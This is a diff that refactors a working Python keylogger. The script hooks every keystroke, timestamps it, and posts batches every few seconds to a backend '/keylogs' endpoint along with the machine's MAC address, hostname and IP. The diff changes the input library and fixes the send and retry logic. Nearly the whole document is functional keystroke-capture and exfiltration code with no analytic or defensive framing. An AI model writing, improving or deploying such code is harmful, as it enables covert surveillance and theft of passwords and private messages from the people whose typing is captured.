@@ -1,126 +1,99 @@
-from pynput import keyboard
-import requests
 import threading
-from datetime import datetime
 import time
+import requests
 import socket
-import uuid
+from datetime import datetime
+import keyboard
+from utils import BACKEND_URL, get_ip, get_mac
 
-# Interval in seconds to send batched keystrokes
-SEND_INTERVAL = 20  # Adjust as needed (e.g., 5 seconds)
-
-# Buffer to store keystrokes
+SEND_INTERVAL = 5
 keystroke_buffer = []
-buffer_lock = threading.Lock()  # Thread-safe access to the buffer
+buffer_lock = threading.Lock()
 
 
-# Function to send batched keystrokes to the backend
 def send_batched_keystrokes(backend: str):
     while True:
         time.sleep(SEND_INTERVAL)
         with buffer_lock:
-            if keystroke_buffer:  # Only send if there are keystrokes
-                mac = (
-                    ":".join(
-                        [
-                            "{:02x}".format((uuid.getnode() >> i) & 0xFF)
-                            for i in range(0, 8 * 6, 8)
-                        ][::-1]
-                    ),
-                )[0]
+            if keystroke_buffer:
+                mac = get_mac()
                 payload = {
                     "deviceId": mac,
                     "mac": mac,
-                    "hostname": socket.gethostbyaddr(socket.gethostname())[0],
+                    "hostname": socket.gethostname(),
                     "ip": get_ip(),
                     "keys": keystroke_buffer.copy(),
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 }
-                keystroke_buffer.clear()  # Clear the buffer after copying
+                keystroke_buffer.clear()
+                # print(f"Sending payload: {payload}")  # Debug payload
                 try:
                     response = requests.post(f"{backend}/keylogs", json=payload)
                     response.raise_for_status()
-                    print(f"Sent {len(payload)} keystrokes to backend")
+                    # print(f"Sent {len(payload['keys'])} keystrokes to backend")
                 except requests.exceptions.RequestException as e:
                     print(f"Failed to send keystrokes: {e}")
-                    # Optionally, add failed keystrokes back to buffer for retry
-                    keystroke_buffer.extend(payload)
+                    keystroke_buffer.extend(payload["keys"])
 
 
-# Function to add a keystroke to the buffer
 def buffer_keystroke(key_str):
+    # Ensure key_str is a valid string
+    if not isinstance(key_str, str) or not key_str or key_str == "unknown":
+        return
     with buffer_lock:
         keystroke_buffer.append(
-            {
-                "key": key_str,
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            }
+            {"key": key_str, "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
         )
 
 
-def get_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        # doesn't even have to be reachable
-        s.connect(("89.207.132.170", 1))
-        IP = s.getsockname()[0]
-    except Exception:
-        IP = "127.0.0.1"
-    finally:
-        s.close()
-    return IP
-
-
-# Function to handle key press events
 def handle_key_press(key):
-    print("{} was just preseed to buffer".format(key))
-    try:
-        key_str = key.char  # Alphanumeric keys
-    except AttributeError:
-        key_str = str(key)  # Special keys (e.g., Key.space)
-
+    key_str = key.name if hasattr(key, "name") else str(key)
+    print(f"{key_str} was just pressed to buffer")
     buffer_keystroke(key_str)
 
 
-# Function to handle key release (stops listener on Esc)
 def handle_key_release(key):
     print("releasing something")
-    if key == keyboard.Key.esc:
-        # Send any remaining keystrokes before stopping
+    if key.name == "esc":
         with buffer_lock:
             if keystroke_buffer:
-                send_immediate()
-        pass
+                send_immediate(BACKEND_URL)
+        return False
 
 
-# Function to send buffer immediately (used on shutdown)
-def send_immediate():
+def send_immediate(backend):
     with buffer_lock:
         if keystroke_buffer:
-            payload = keystroke_buffer.copy()
+            mac = get_mac()
+            payload = {
+                "deviceId": mac,
+                "mac": mac,
+                "hostname": socket.gethostname(),
+                "ip": get_ip(),
+                "keys": keystroke_buffer.copy(),
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            }
             keystroke_buffer.clear()
+            print(f"Sending immediate payload: {payload}")  # Debug payload
             try:
-                response = requests.post(BACKEND_URL, json=payload)
+                response = requests.post(f"{backend}/keylogs", json=payload)
                 response.raise_for_status()
-                print(f"Sent {len(payload)} keystrokes to backend (immediate)")
+                print(f"Sent {len(payload['keys'])} keystrokes to backend (immediate)")
             except requests.exceptions.RequestException as e:
                 print(f"Failed to send immediate keystrokes: {e}")
 
 
-# Start the keyboard listener and batch sender
 def main():
     print(
         f"Starting keystroke recorder... Sending batches every {SEND_INTERVAL} seconds. Press Esc to stop."
     )
-
-    # Start the batch sending thread
-    sender_thread = threading.Thread(target=send_batched_keystrokes, daemon=True)
+    sender_thread = threading.Thread(
+        target=send_batched_keystrokes, args=(BACKEND_URL,), daemon=True
+    )
     sender_thread.start()
-
-    # Start the keyboard listener
-    with keyboard.Listener(
-        on_press=handle_key_press, on_release=handle_key_release
-    ) as listener:
-        listener.join()
+    keyboard.hook(handle_key_press)
+    keyboard.wait(None)
+    keyboard.unhook_all()
 
 
 if __name__ == "__main__":
